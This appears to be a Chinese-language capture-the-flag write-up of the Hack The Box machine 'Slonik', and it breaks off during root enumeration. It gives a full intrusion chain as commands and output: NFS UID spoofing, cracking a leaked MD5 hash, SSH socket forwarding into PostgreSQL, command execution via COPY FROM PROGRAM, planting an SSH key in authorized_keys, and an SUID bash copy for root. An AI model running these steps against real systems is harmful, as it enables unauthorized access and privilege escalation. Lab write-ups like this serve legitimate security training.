## Slonik
### 总结
```
所有端口的 TTL 值均显示为 63，这与一跳之外的 Linux 系统的预期 TTL 值相符
showmount -e将列出NFS上可用的挂载点（份额）：
[★]$ showmount -e 10.129.234.160
Export list for 10.129.234.160:
/var/backups *
/home        *

[★]$ mkdir /tmp/nfs
[★]$ sudo mount -t nfs 10.129.234.160:/home /tmp/nfs
[★]$ ls -la /tmp/nfs
total 20
drwxr-xr-x  3 root root  4096 Oct 24  2023 .
drwxrwxrwt 20 root root 12288 Mar  9 07:12 ..
drwxr-x---  5 1337 1337  4096 Sep 22 07:46 service
[★]$ cd /tmp/nfs
[★]$ sudo useradd service -u 1337
[★]$ sudo su service
sh: 1: [[: not found
\[\033[1;32m\]\342\224\214\342\224\200[\[\033[1;37m\]\u\[\033[01;32m\]@\[\033[01;34m\]\h\[\033[1;32m\]]\342\224\200[\[\033[1;37m\]\w\[\033[1;32m\]]\n\[\033[1;32m\]\342\224\224\342\224\200\342\224\200\342\225\274 [\[\e[01;33m\]★\[\e[01;32m\]]$ \[\e[0m\]\[\033[1;32m\]bash
service@htb-xybs8a7uq9:/tmp/nfs$ ls -la 
total 20
drwxr-xr-x  3 root    root     4096 Oct 24  2023 .
drwxrwxrwt 20 root    root    12288 Mar  9 07:12 ..
drwxr-x---  5 service service  4096 Sep 22 07:46 service
service@htb-xybs8a7uq9:/tmp/nfs$ ls -la service/
total 40
drwxr-x--- 5 service service 4096 Sep 22 07:46 .
drwxr-xr-x 3 root    root    4096 Oct 24  2023 ..
-rw-r--r-- 1 service service   90 Sep 22 07:46 .bash_history
-rw-r--r-- 1 service service  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 service service 3771 Oct 24  2023 .bashrc
drwx------ 2 service service 4096 Oct 24  2023 .cache
drwxrwxr-x 3 service service 4096 Oct 24  2023 .local
-rw-r--r-- 1 service service  807 Oct 24  2023 .profile
-rw-r--r-- 1 service service  326 Sep 22 07:46 .psql_history
drwxrwxr-x 2 service service 4096 Oct 24  2023 .ssh
service@htb-xybs8a7uq9:/tmp/nfs$ cat service/.bash_history
ls -lah /var/run/postgresql/
file /var/run/postgresql/.s.PGSQL.5432
psql -U postgres
exit
service@htb-xybs8a7uq9:/tmp/nfs$ find / -name postgresql.conf 2>/dev/null
/etc/postgresql/15/main/postgresql.conf
service@htb-xybs8a7uq9:/tmp/nfs$ cd ../../etc/postgresql/15/main/
service@htb-xybs8a7uq9:/etc/postgresql/15/main$ ls -la
total 68
drwxr-xr-x 3 postgres postgres  4096 Oct  7  2024 .
drwxr-xr-x 3 postgres postgres  4096 Oct  7  2024 ..
drwxr-xr-x 2 postgres postgres  4096 Oct  7  2024 conf.d
-rw-r--r-- 1 postgres postgres   315 Oct  7  2024 environment
-rw-r--r-- 1 postgres postgres   143 Oct  7  2024 pg_ctl.conf
-rw-r----- 1 postgres postgres  5002 Oct  7  2024 pg_hba.conf
-rw-r----- 1 postgres postgres  1636 Oct  7  2024 pg_ident.conf
-rw-r--r-- 1 postgres postgres 29709 Oct  7  2024 postgresql.conf
-rw-r--r-- 1 postgres postgres   317 Oct  7  2024 start.conf
service@htb-xybs8a7uq9:/etc/postgresql/15/main$ sudo vi postgresql.conf
service@htb-xybs8a7uq9:/etc/postgresql/15/main$ sudo vi pg_hba.conf
service@htb-xybs8a7uq9:/etc/postgresql/15/main$ sudo systemctl restart postgresql
service@htb-xybs8a7uq9:/etc/postgresql/15/main$ systemctl status postgresql
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; preset: disabled)
     Active: active (exited) since Mon 2026-03-09 07:25:43 CDT; 19s ago
    Process: 27073 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 27073 (code=exited, status=0/SUCCESS)
        CPU: 1ms
service@htb-xybs8a7uq9:/etc/postgresql/15/main$

//数据库 postgres
[★]$ ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
[★]$ psql -h /tmp -U postgres
postgres=# \du
postgres=# \c
postgres=# \l
postgres=# \c service
service=# \dt
service=# select * from users;

service=# CREATE TABLE cmd(output text); 
service=# COPY cmd FROM  PROGRAM 'id'; 
COPY 1
service=# select * from cmd; 
service=# COPY cmd FROM PROGRAM 'mkdir -p /var/lib/postgresql/.ssh';
COPY 0
service=# COPY cmd FROM PROGRAM 'chmod 700 /var/lib/postgresql/.ssh';
COPY 0

[~][★]$ ssh-keygen -t ed25519 //本地生成公钥
[~][★]$ cat /home/syareya55/.ssh/id_ed25519.pub

service=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@nothing') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
COPY 1
service=# COPY cmd FROM PROGRAM 'cat /var/lib/postgresql/.ssh/authorized_keys';
COPY 1
service=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@nothing') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
COPY 1
service=# COPY cmd FROM PROGRAM 'cat /var/lib/postgresql/.ssh/authorized_keys';
COPY 1

[~/.ssh][★]$ ssh -i id_ed25519 postgres@10.129.234.160
pspy：https://github.com/DominicBreuker/pspy
[~/.ssh][★]$ scp -i id_ed25519 pspy64 postgres@10.129.234.160:/dev/shm/  //上传

[~/.ssh][★]$ ssh -i id_ed25519 postgres@10.129.234.160
postgres@slonik:~$ cd /dev/shm
postgres@slonik:/dev/shm$ ls
PostgreSQL.2952396296  pspy64
postgres@slonik:/dev/shm$ chmod +x pspy64
postgres@slonik:/dev/shm$ ./pspy64
2026/03/11 08:49:03 CMD: UID=0    PID=17985  | /usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/ 
2026/03/11 08:49:03 CMD: UID=0    PID=17982  | /bin/bash /usr/bin/backup 

//存在一些差异：
postgres@slonik:~/14/main$ diff <(ls -1) <(ls /opt/backups/current/ -1) //这里发现/opt/backups/current/  无法复制到/bin/bash /usr/bin/backup 
1a2,3
> backup_label
> backup_manifest
20,21d21
< postmaster.opts
< postmaster.pid

//所以手动复制给它，root权限可以复制/bin/bash，不需要/usr/bin/backup 
postgres@slonik:~/14/main$ cp /bin/bash .

postgres@slonik:~/14/main$ chmod 6777 bash
```
```
[★]$ nmap -sV -sC 10.129.234.160
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-09 01:19 CDT
Nmap scan report for 10.129.234.160
Host is up (0.0098s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2d:8d:0a:43:a7:58:20:73:6b:8c:fc:b0:d1:2f:45:07 (ECDSA)
|_  256 82:fb:90:b0:eb:ac:20:a2:53:5e:3c:7c:d3:3c:34:79 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39772/udp6  mountd
|   100005  1,2,3      40219/udp   mountd
|   100005  1,2,3      53885/tcp6  mountd
|   100005  1,2,3      56033/tcp   mountd
|   100021  1,3,4      33115/udp6  nlockmgr
|   100021  1,3,4      38467/udp   nlockmgr
|   100021  1,3,4      42609/tcp6  nlockmgr
|_  100021  1,3,4      44369/tcp   nlockmgr
2049/tcp open  nfs     3-4 (RPC #100003)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds

[★]$ sudo nmap -p- -vvv --min-rate 10000 10.129.234.160
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-09 01:20 CDT
Initiating Ping Scan at 01:20
Scanning 10.129.234.160 [4 ports]
Completed Ping Scan at 01:20, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:20
Completed Parallel DNS resolution of 1 host. at 01:20, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 01:20
Scanning 10.129.234.160 [65535 ports]
Discovered open port 111/tcp on 10.129.234.160
Discovered open port 22/tcp on 10.129.234.160
Discovered open port 44369/tcp on 10.129.234.160
Discovered open port 57913/tcp on 10.129.234.160
Discovered open port 2049/tcp on 10.129.234.160
Discovered open port 56033/tcp on 10.129.234.160
Discovered open port 48909/tcp on 10.129.234.160
Discovered open port 39545/tcp on 10.129.234.160
Completed SYN Stealth Scan at 01:21, 5.59s elapsed (65535 total ports)
Nmap scan report for 10.129.234.160
Host is up, received echo-reply ttl 63 (0.0087s latency).
Scanned at 2026-03-09 01:20:55 CDT for 5s
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
2049/tcp  open  nfs     syn-ack ttl 63
39545/tcp open  unknown syn-ack ttl 63
44369/tcp open  unknown syn-ack ttl 63
48909/tcp open  unknown syn-ack ttl 63
56033/tcp open  unknown syn-ack ttl 63
57913/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.74 seconds
           Raw packets sent: 65587 (2.886MB) | Rcvd: 65542 (2.622MB)

[★]$ nmap -p 22,111,2049,39545,44369,48909,56033,57913 -sCV 10.129.234.160
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-09 01:22 CDT
Nmap scan report for 10.129.234.160
Host is up (0.0089s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2d:8d:0a:43:a7:58:20:73:6b:8c:fc:b0:d1:2f:45:07 (ECDSA)
|_  256 82:fb:90:b0:eb:ac:20:a2:53:5e:3c:7c:d3:3c:34:79 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39772/udp6  mountd
|   100005  1,2,3      40219/udp   mountd
|   100005  1,2,3      53885/tcp6  mountd
|   100005  1,2,3      56033/tcp   mountd
|   100021  1,3,4      33115/udp6  nlockmgr
|   100021  1,3,4      38467/udp   nlockmgr
|   100021  1,3,4      42609/tcp6  nlockmgr
|   100021  1,3,4      44369/tcp   nlockmgr
|   100024  1          34449/tcp6  status
|   100024  1          43818/udp   status
|   100024  1          57913/tcp   status
|   100024  1          58236/udp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
39545/tcp open  mountd   1-3 (RPC #100005)
44369/tcp open  nlockmgr 1-4 (RPC #100021)
48909/tcp open  mountd   1-3 (RPC #100005)
56033/tcp open  mountd   1-3 (RPC #100005)
57913/tcp open  status   1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
#### 所有端口的 TTL 值均显示为 63，这与一跳之外的 Linux 系统的预期 TTL 值相符
#### showmount -e将列出NFS上可用的挂载点（份额）：
```
[★]$ showmount -e 10.129.234.160
Export list for 10.129.234.160:
/var/backups *
/home        *

[★]$ mkdir /tmp/nfs
[★]$ sudo mount -t nfs 10.129.234.160:/home /tmp/nfs
[★]$ ls -la /tmp/nfs
total 20
drwxr-xr-x  3 root root  4096 Oct 24  2023 .
drwxrwxrwt 21 root root 12288 Mar  9 01:29 ..
drwxr-x---  5 1337 1337  4096 Sep 22 07:46 service

[★]$ cd /tmp/nfs
[★]$ sudo useradd service -u 1337
[★]$ sudo su service
sh: 1: [[: not found
\[\033[1;32m\]\342\224\214\342\224\200[\[\033[1;37m\]\u\[\033[01;32m\]@\[\033[01;34m\]\h\[\033[1;32m\]]\342\224\200[\[\033[1;37m\]\w\[\033[1;32m\]]\n\[\033[1;32m\]\342\224\224\342\224\200\342\224\200\342\225\274 [\[\e[01;33m\]★\[\e[01;32m\]]$ \[\e[0m\]\[\033[1;32m\]
sh: 1: [[: not found
\[\033[1;32m\]\342\224\214\342\224\200[\[\033[1;37m\]\u\[\033[01;32m\]@\[\033[01;34m\]\h\[\033[1;32m\]]\342\224\200[\[\033[1;37m\]\w\[\033[1;32m\]]\n\[\033[1;32m\]\342\224\224\342\224\200\342\224\200\342\225\274 [\[\e[01;33m\]★\[\e[01;32m\]]$ \[\e[0m\]\[\033[1;32m\]bash
service@htb-pa4lnyma7f:/home/syareya55$ ls -la /tmp/nfs/service
total 40
drwxr-x--- 5 service service 4096 Sep 22 07:46 .
drwxr-xr-x 3 root    root    4096 Oct 24  2023 ..
-rw-r--r-- 1 service service   90 Sep 22 07:46 .bash_history
-rw-r--r-- 1 service service  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 service service 3771 Oct 24  2023 .bashrc
drwx------ 2 service service 4096 Oct 24  2023 .cache
drwxrwxr-x 3 service service 4096 Oct 24  2023 .local
-rw-r--r-- 1 service service  807 Oct 24  2023 .profile
-rw-r--r-- 1 service service  326 Sep 22 07:46 .psql_history
drwxrwxr-x 2 service service 4096 Oct 24  2023 .ssh
service@htb-pa4lnyma7f:/home/syareya55$
service@htb-pa4lnyma7f:/home/syareya55$ ls -la /tmp/nfs/service/.ssh
total 16
drwxrwxr-x 2 service service 4096 Oct 24  2023 .
drwxr-x--- 5 service service 4096 Sep 22 07:46 ..
-rw------- 1 service service   96 Oct 24  2023 authorized_keys
-rw-r--r-- 1 service service   96 Oct 24  2023 id_ed25519.pub

service@htb-pa4lnyma7f:/home/syareya55$ cat /tmp/nfs/service/.psql_history
CREATE DATABASE service;
\c service;
CREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, description TEXT);
INSERT INTO users (username, password, description)VALUES ('service', 'aaabf0d39951f3e6c3e8a7911df524c2'WHERE', network access account');
select * from users;
\q
service@htb-pa4lnyma7f:/home$ cat /tmp/nfs/service/.bash_history
ls -lah /var/run/postgresql/
file /var/run/postgresql/.s.PGSQL.5432
psql -U postgres                       //数据库是 PostgreSQL,没有写密码
exit
service@htb-pa4lnyma7f:/home/syareya55$ find / -name postgresql.conf 2>/dev/null
/etc/postgresql/15/main/postgresql.conf
```
#### 得到密码hash
https://crackstation.net/
```
aaabf0d39951f3e6c3e8a7911df524c2	md5  service
```
#### 登录凭证
```
[★]$ netexec ssh 10.129.234.160 -u service -p service
SSH         10.129.234.160  22     10.129.234.160   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.234.160  22     10.129.234.160   [+] service:service  Network Devices
```
#### 要访问 PostgreSQL 数据库正在监听的 UNIX 套接字（它被当作一个文件来处理），如.bash_history文件中所示。SSH 实际上可以进行端口转发，将数据转发-L到 UNIX 套接字：
```
[★]$ netexec ssh 10.129.234.160 -u service -p service
SSH         10.129.234.160  22     10.129.234.160   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.234.160  22     10.129.234.160   [+] service:service  Network Devices

[★]$ sshpass -p service ssh -N -L 5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160  //转接

[★]$ psql -h 127.0.0.1 -p 5432 -U postgres  //登录不上
psql: error: connection to server at "127.0.0.1", port 5432 failed: Connection refused
	Is the server running on that host and accepting TCP/IP connections?

[★]$ psql -h localhost -p 5432 -U postgres  ////登录不上
psql: error: connection to server at "localhost" (::1), port 5432 failed: Connection refused
	Is the server running on that host and accepting TCP/IP connections?
connection to server at "localhost" (127.0.0.1), port 5432 failed: Connection refused
	Is the server running on that host and accepting TCP/IP connections?
connection to server at "localhost" (127.0.0.1), port 5432 failed: Connection refused
	Is the server running on that host and accepting TCP/IP connections?
```
#### 换目录转接口,使用的用户是service@10.129.234.160
```
[★]$ ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
The authenticity of host '10.129.234.160 (10.129.234.160)' can't be established.
ED25519 key fingerprint is SHA256:j/hcANass/0veF/m0NAMOR41osL5zUMMMQ9nCYiwjmY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.160' (ED25519) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&             @@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@   ############.    ############   ##########*  &@@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
(service@10.129.234.160) Password: service
```
#### 本地/tmp目录登录远程用户postgres
```
[★]$ psql -h /tmp -U postgres
psql (15.14 (Debian 15.14-0+deb12u1), server 14.19 (Ubuntu 14.19-0ubuntu0.22.04.1))
Type "help" for help.

postgres=# \du
ole name |                         Attributes                         | Member of 
-----------+------------------------------------------------------------+-----------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}

postgres=# \c
psql (15.14 (Debian 15.14-0+deb12u1), server 14.19 (Ubuntu 14.19-0ubuntu0.22.04.1))
You are now connected to database "postgres" as user "postgres".
postgres=# \l
 List of databases
   Name    |  Owner   | Encoding | Collate |  Ctype  | ICU Locale | Locale Provider |   Access privileges   
-----------+----------+----------+---------+---------+------------+-----------------+-----------------------
 postgres  | postgres | UTF8     | C.UTF-8 | C.UTF-8 |            | libc            | 
 service   | postgres | UTF8     | C.UTF-8 | C.UTF-8 |            | libc            | 
 template0 | postgres | UTF8     | C.UTF-8 | C.UTF-8 |            | libc            | =c/postgres          +
           |          |          |         |         |            |                 | postgres=CTc/postgres
 template1 | postgres | UTF8     | C.UTF-8 | C.UTF-8 |            | libc            | =c/postgres          +
           |          |          |         |         |            |                 | postgres=CTc/postgres
(4 rows)

postgres=#
```
#### 得出的结论是:不用修改postgresql.conf配置，不用自己创建service表格，远程获取才是意义所在！
#### 这里被切用户了，在service下面是表格
```
postgres=# \c service
psql (15.14 (Debian 15.14-0+deb12u1), server 14.19 (Ubuntu 14.19-0ubuntu0.22.04.1))
You are now connected to database "service" as user "postgres".
service=# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | users | table | postgres

service=# select * from users;
 id | username |             password             |      description       
----+----------+----------------------------------+------------------------
  1 | service  | aaabf0d39951f3e6c3e8a7911df524c2 | network access account


```
### SSH
#### 要通过 PostgreSQL 执行命令，我将创建一个表来存储输出，将结果复制到其中，然后获取它们：
```
service=# CREATE TABLE cmd(output text); //创建一个表 cmd，表里只有一列：output，数据类型是：text；作用：用于存放命令执行的输出结果
CREATE TABLE
service=# COPY cmd FROM  PROGRAM 'id'; //允许数据库服务器执行 操作系统命令，并把输出写入表中
COPY 1
service=# select * from cmd; //查看刚才命令执行的结果
                                 output                                 
------------------------------------------------------------------------
 uid=115(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
(1 row)
```
#### `passwd` 文件显示 `postgres` 用户的主目录是 `/var/lib/postgresql`。它没有 `.ssh` 目录，但我会创建一个，并将我的公钥放入其中：
```
service=# COPY cmd FROM PROGRAM 'mkdir -p /var/lib/postgresql/.ssh';
COPY 0
service=# COPY cmd FROM PROGRAM 'chmod 700 /var/lib/postgresql/.ssh';
COPY 0
```
#### 我又把上面的命令再执行一遍
```
service=# COPY cmd FROM PROGRAM 'id';
COPY 1
service=# select * from cmd;
                                 output                                 
------------------------------------------------------------------------
 uid=115(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
 uid=115(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
(2 rows) //它会出现2行
```
#### 在我的攻击主机上生成ed25519的公钥
```
[~][★]$ ssh-keygen -t ed25519
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/syareya55/.ssh/id_ed25519): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/syareya55/.ssh/id_ed25519
Your public key has been saved in /home/syareya55/.ssh/id_ed25519.pub
[~][★]$ cat /home/syareya55/.ssh/id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@nothing
```
#### 我还可以将输入信息传递给一个命令，从而实现诸如创建文件之类的操作：
```
service=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@nothing') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
COPY 1
service=# COPY cmd FROM PROGRAM 'cat /var/lib/postgresql/.ssh/authorized_keys';
COPY 1
```
#### 使用密钥登录啦
```
[~/.ssh][★]$ ssh -i id_ed25519 postgres@10.129.234.160
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&             @@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@   ############.    ############   ##########*  &@@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1036-aws x86_64)

postgres@slonik:~$ pwd
/var/lib/postgresql
postgres@slonik:~$ ls
14  user.txt
postgres@slonik:~$ cat user.txt
```
### Shell as root
#### Enumeration 列举
#### 我已经通过 NFS 发现，在 /home 目录下拥有用户主目录的唯一用户是“服务”用户，而拥有设置好登录 shell 的非根用户只有“postgres”用户
#### 而“postgres”用户在使用 sudo 时需要密码，而我却没有这个密码：
```
postgres@slonik:/home$ sudo -l
[sudo] password for postgres:
```
#### 0xdf 之前已经提到过，位于 /var/backups 目录下的新备份文件每分钟都会生成一次，并且其路径是从 /opt/backups/current 开始的：
```
postgres@slonik:/opt$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Oct 23  2023 .
drwxr-xr-x 19 root root 4096 Sep 22 11:04 ..
drwxr-xr-x  3 root root 4096 Oct 23  2023 backups
postgres@slonik:/opt$ cd backups
postgres@slonik:/opt/backups$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Oct 23  2023 .
drwxr-xr-x  3 root root 4096 Oct 23  2023 ..
drwxr-xr-x 19 root root 4096 Mar 11 08:21 current
postgres@slonik:/opt/backups$ cd current
postgres@slonik:/opt/backups/current$ ls -la
total 268
drwxr-xr-x 19 root root   4096 Mar 11 08:21 .
drwxr-xr-x  3 root root   4096 Oct 23  2023 ..
-rw-------  1 root root      3 Mar 11 08:21 PG_VERSION
-rw-------  1 root root    227 Mar 11 08:21 backup_label
-rw-------  1 root root 181011 Mar 11 08:21 backup_manifest
drwx------  6 root root   4096 Mar 11 08:21 base
drwx------  2 root root   4096 Mar 11 08:21 global
drwx------  2 root root   4096 Mar 11 08:21 pg_commit_ts
drwx------  2 root root   4096 Mar 11 08:21 pg_dynshmem
drwx------  4 root root   4096 Mar 11 08:21 pg_logical
drwx------  4 root root   4096 Mar 11 08:21 pg_multixact
drwx------  2 root root   4096 Mar 11 08:21 pg_notify
drwx------  2 root root   4096 Mar 11 08:21 pg_replslot
drwx------  2 root root   4096 Mar 11 08:21 pg_serial
drwx------  2 root root   4096 Mar 11 08:21 pg_snapshots
drwx------  2 root root   4096 Mar 11 08:21 pg_stat
drwx------  2 root root   4096 Mar 11 08:21 pg_stat_tmp
drwx------  2 root root   4096 Mar 11 08:21 pg_subtrans
drwx------  2 root root   4096 Mar 11 08:21 pg_tblspc
drwx------  2 root root   4096 Mar 11 08:21 pg_twophase
drwx------  3 root root   4096 Mar 11 08:21 pg_wal
drwx------  2 root root   4096 Mar 11 08:21 pg_xact
-rw-------  1 root root     88 Mar 11 08:21 postgresql.auto.conf
postgres@slonik:/opt/backups/current$ 

```
#### 位于 /opt/backups/current 目录下的所有文件都是此刻刚刚创建的。将上传 pspy：
https://github.com/DominicBreuker/pspy
#### 手动下载pspy64
https://github.com/DominicBreuker/pspy/releases
```
[~/.ssh][★]$ ls
